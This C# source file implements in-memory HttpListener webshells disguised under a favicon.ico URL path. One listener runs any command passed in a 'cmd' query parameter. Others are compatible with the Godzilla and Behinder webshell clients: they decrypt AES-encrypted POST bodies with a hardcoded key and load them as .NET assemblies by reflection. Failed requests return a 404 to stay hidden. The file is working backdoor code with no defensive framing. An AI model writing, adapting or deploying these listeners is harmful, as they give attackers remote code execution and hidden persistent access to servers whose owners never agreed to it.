using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Web;
namespace httplistener
{
    class Program
    {
        static void Main(string[] args)
        {
            String[] s = { "http://*:55555/favicon.ico/" };
            string key = "3c6e0b8a9c15224a";
            string pass = "pass";
            // 404返回的数据，默认为空即可
            string notFoundData = "";
            byte[] notFoundData_byte = Convert.FromBase64String(notFoundData);
            //cmdHttpListener(s);
            //GodzillaHttpListner_AES_Raw(s,notFoundData_byte,key,pass);
            //GodzillaHttpListner_AES_Base64(s, notFoundData_byte, key, pass );
            
            //BehinderHttpListener_AES_Raw(s, notFoundData_byte);
        }
        public static void cmdHttpListener(String[] prefixes)
        {
            
            // 判断是否支持HTTPListener
            if (!HttpListener.IsSupported)
            {
                Console.WriteLine("Windows XP SP2 or Server 2003 is required to use the HttpListener class.");
                return;
            }
            // 输入的URI, 内部马可以以http://*:port/favicon.ico/为例
            if (prefixes == null || prefixes.Length == 0)
                throw new ArgumentException("prefixes");
            // 创建Listener
            HttpListener httpListener = new HttpListener();
            // 加入prefixes
            foreach (String prefix in prefixes)
            {
                httpListener.Prefixes.Add(prefix);
            }
            // 启动监听器，进行监听
            
            httpListener.Start();

            Console.WriteLine("Listening...");
            // 从上下文中获取Request，Response对象
            
            while (true)
            {
                HttpListenerContext httpListenerContext = httpListener.GetContext();
                HttpListenerRequest request = httpListenerContext.Request;
                HttpListenerResponse response = httpListenerContext.Response;
                try
                {
                    String cmd = request.QueryString["cmd"];
                    if (cmd != null)
                    {
                        try
                        {
                            Process p = new Process();
                            p.StartInfo.FileName = cmd;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.Start();
                            byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                            response.ContentLength64 = data.Length;
                            System.IO.Stream output = response.OutputStream;
                            output.Write(data, 0, data.Length);
                            output.Close();
                            //httpListener.Stop();
                        }
                        catch (Exception e)
                        {
                            //httpListener.Stop();
                            Console.WriteLine(e.ToString());
                        }

                    }
                    else
                    {
                        byte[] data = Encoding.UTF8.GetBytes("NULL");
                        response.ContentLength64 = data.Length;
                        System.IO.Stream output = response.OutputStream;
                        output.Write(data, 0, data.Length);
                        output.Close();
                        //httpListener.Stop();
                    }
                }
                catch(Exception e)
                {
                    Console.WriteLine("end");
                    Console.WriteLine(e.ToString());
                    httpListener.Stop();
                }
                
            }
        }
        // 默认密码: rebeyond
        //public static void BehinderHttpListener_AES_Raw(String[] prefixes, byte[] notFoundData_byte, string key = "e45e329feb5d925b")
        //{
        //     判断是否支持HTTPListener
        //    if (!HttpListener.IsSupported)
        //    {
        //        Console.WriteLine("Windows XP SP2 or Server 2003 is required to use the HttpListener class.");
        //        return;
        //    }
        //     输入的URI, 内部马可以以http://*:port/favicon.ico/为例
        //    if (prefixes == null || prefixes.Length == 0)
        //        throw new ArgumentException("prefixes");
        //     创建Listener
        //    HttpListener httpListener = new HttpListener();
        //     加入prefixes
        //    foreach (String prefix in prefixes)
        //    {
        //        httpListener.Prefixes.Add(prefix);
        //    }
        //     启动监听器，进行监听

        //    httpListener.Start();
        //    Console.WriteLine("Listening...");

        //    while (true)
        //    {
        //        try
        //        {
        //             从上下文中获取Request，Response对象
        //            HttpListenerContext httpListenerContext = httpListener.GetContext();
        //            HttpListenerRequest request = httpListenerContext.Request;
        //            HttpListenerResponse response = httpListenerContext.Response;

        //            HttpRequest req = new HttpRequest("", request.Url.ToString(), request.QueryString.ToString());
        //            System.IO.StreamWriter writer = new System.IO.StreamWriter(response.OutputStream);
        //            HttpResponse resp = new HttpResponse(writer);
        //            HttpContext httpContext = new HttpContext(req, resp);
        //            try
        //            {
        //                var k = Encoding.Default.GetBytes(key);
        //                Console.WriteLine(request.Headers.Get("Content-Length"));
        //                 从request中获取post的数据
        //                int contentLength = int.Parse(request.Headers.Get("Content-Length"));
        //                byte[] postData = new byte[contentLength];
        //                request.InputStream.Read(postData, 0, contentLength);
                        
        //                Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(postData, 0, postData.Length)).CreateInstance("U").Equals(httpContext);
        //            }
        //            catch(Exception e)
        //            {
        //                Console.WriteLine(e.ToString());
        //                response.StatusCode = 404;
        //                response.ContentLength64 = notFoundData_byte.Length;
        //                System.IO.Stream output = response.OutputStream;
        //                output.Write(notFoundData_byte, 0, notFoundData_byte.Length);
        //                output.Close();
        //            }
        //        }
        //        catch(Exception e)
        //        {
        //            Console.WriteLine(e.ToString());
        //            httpListener.Stop();
        //        }
        //    }
        //}

        // 默认密码: pass
        public static void GodzillaHttpListner_AES_Raw(String[] prefixes, byte[] notFoundData_byte , string key= "3c6e0b8a9c15224a", string pass = "pass")
        {
            string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "");
            // 判断是否支持HTTPListener
            if (!HttpListener.IsSupported)
            {
                Console.WriteLine("Windows XP SP2 or Server 2003 is required to use the HttpListener class.");
                return;
            }
            // 输入的URI, 内部马可以以http://*:port/favicon.ico/为例
            if (prefixes == null || prefixes.Length == 0)
                throw new ArgumentException("prefixes");
            // 创建Listener
            HttpListener httpListener = new HttpListener();
            // 加入prefixes
            foreach (String prefix in prefixes)
            {
                httpListener.Prefixes.Add(prefix);
            }
            // 启动监听器，进行监听
            Hashtable sessionTable = new Hashtable();
            
            httpListener.Start();
            Console.WriteLine("Listening...");
            while (true)
            {
                try
                {
                    // 从上下文中获取Request，Response对象
                    HttpListenerContext httpListenerContext = httpListener.GetContext();
                    HttpListenerRequest request = httpListenerContext.Request;
                    HttpListenerResponse response = httpListenerContext.Response;

                    // 将httpListenerContext 转为 HttpContext
                    HttpRequest req = new HttpRequest("", request.Url.ToString(), request.QueryString.ToString());
                    System.IO.StreamWriter writer = new System.IO.StreamWriter(response.OutputStream);
                    HttpResponse res = new HttpResponse(writer);
                    HttpContext Context = new HttpContext(req, res);
                    try
                    {
                        Console.WriteLine(request.Headers.Get("Content-Length"));
                        // 从request中获取post的数据
                        int contentLength = int.Parse(request.Headers.Get("Content-Length"));
                        byte[] postData = new byte[contentLength];
                        request.InputStream.Read(postData, 0, contentLength);

                        // AES解密
                        byte[] data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(postData, 0, postData.Length);
                        // 初始化
                        if (sessionTable["payload"] == null)
                        {
                            Console.WriteLine("[+]init");
                            Console.WriteLine("length:" + contentLength);

                            // 通过反射获取payload
                            sessionTable["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
                        }
                        else
                        {
                            Console.WriteLine("[+]run");
                            Console.WriteLine("length:" + contentLength);
                            System.IO.MemoryStream outStream = new System.IO.MemoryStream();
                            object o = ((System.Reflection.Assembly)sessionTable["payload"]).CreateInstance("LY");
                            o.Equals(outStream);
                            o.Equals(Context);
                            o.Equals(data);
                            o.ToString();
                            byte[] r = outStream.ToArray();
                            outStream.Dispose();
                            if (r.Length > 0)
                            {
                                r = new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length);
                                response.StatusCode = 200;
                                response.ContentLength64 = r.Length;
                                Stream stm = response.OutputStream;
                                stm.Write(r, 0, r.Length);
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.ToString());
                        response.StatusCode = 404;
                        response.ContentLength64 = notFoundData_byte.Length;
                        System.IO.Stream output = response.OutputStream;
                        output.Write(notFoundData_byte, 0, notFoundData_byte.Length);
                        output.Close();

                    }
                }
                catch(Exception e)
                {
                    Console.WriteLine(e.ToString());
                    httpListener.Stop();
                }
            }
        }

        public static Dictionary<string, string> parse_post(HttpListenerRequest request)
        {
            var raw_data = new StreamReader(request.InputStream,request.ContentEncoding).ReadToEnd();
            Dictionary<string, string> postParams = new Dictionary<string, string>();
            string[] rawParams = raw_data.Split('&');
            foreach(string param in rawParams)
            {
                string[] key_and_value = param.Split('=');
                string param_key = key_and_value[0];
                string param_value = HttpUtility.UrlDecode(key_and_value[1]);
                postParams.Add(param_key, param_value);
            }
            return postParams;
        }

        public static void GodzillaHttpListner_AES_Base64(String[] prefixes, byte[] notFoundData_byte, string key = "3c6e0b8a9c15224a", string pass = "pass")
        {
            string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "");
            // 判断是否支持HTTPListener
            if (!HttpListener.IsSupported)
            {
                Console.WriteLine("Windows XP SP2 or Server 2003 is required to use the HttpListener class.");
                return;
            }
            // 输入的URI, 内部马可以以http://*:port/favicon.ico/为例
            if (prefixes == null || prefixes.Length == 0)
                throw new ArgumentException("prefixes");
            // 创建Listener
            HttpListener httpListener = new HttpListener();
            // 加入prefixes
            foreach (String prefix in prefixes)
            {
                httpListener.Prefixes.Add(prefix);
            }
            // 启动监听器，进行监听
            Hashtable sessionTable = new Hashtable();

            httpListener.Start();
            Console.WriteLine("Listening...");
            while (true)
            {
                try
                {
                    // 从上下文中获取Request，Response对象
                    HttpListenerContext httpListenerContext = httpListener.GetContext();
                    HttpListenerRequest request = httpListenerContext.Request;
                    HttpListenerResponse response = httpListenerContext.Response;

                    // 将httpListenerContext 转为 HttpContext
                    HttpRequest req = new HttpRequest("", request.Url.ToString(), request.QueryString.ToString());
                    System.IO.StreamWriter writer = new System.IO.StreamWriter(response.OutputStream);
                    HttpResponse res = new HttpResponse(writer);
                    HttpContext Context = new HttpContext(req, res);
                    try
                    {
                        Console.WriteLine(request.Headers.Get("Content-Length"));
                        // 从request中获取post的数据
                        int contentLength = int.Parse(request.Headers.Get("Content-Length"));
                        // Base64 解码
                        Dictionary<string, string> posParams = parse_post(request);
                        byte[] data = System.Convert.FromBase64String(posParams[pass]);
                        // AES解密
                        data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);
                        // 初始化
                        if (sessionTable["payload"] == null)
                        {
                            Console.WriteLine("[+]init");
                            Console.WriteLine("length:" + contentLength);

                            // 通过反射获取payload
                            sessionTable["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
                        }
                        else
                        {
                            Console.WriteLine("[+]run");
                            Console.WriteLine("length:" + contentLength);
                            System.IO.MemoryStream outStream = new System.IO.MemoryStream();
                            object o = ((System.Reflection.Assembly)sessionTable["payload"]).CreateInstance("LY");
                            o.Equals(outStream);
                            o.Equals(Context);
                            o.Equals(data);
                            o.ToString();
                            byte[] r = outStream.ToArray();
                            outStream.Dispose();
                            response.StatusCode = 200;
                            string res_data = md5.Substring(0, 16) + System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)) + md5.Substring(16);
                            byte[] res_data_bytes = Encoding.ASCII.GetBytes(res_data);
                            response.ContentLength64 = res_data_bytes.Length;
                            response.OutputStream.Write(res_data_bytes, 0, res_data_bytes.Length);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.ToString());
                        response.StatusCode = 404;
                        
                        response.ContentLength64 = notFoundData_byte.Length;
                        System.IO.Stream output = response.OutputStream;
                        output.Write(notFoundData_byte, 0, notFoundData_byte.Length);
                        output.Close();

                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                    httpListener.Stop();
                }
            }
        }
    }
}
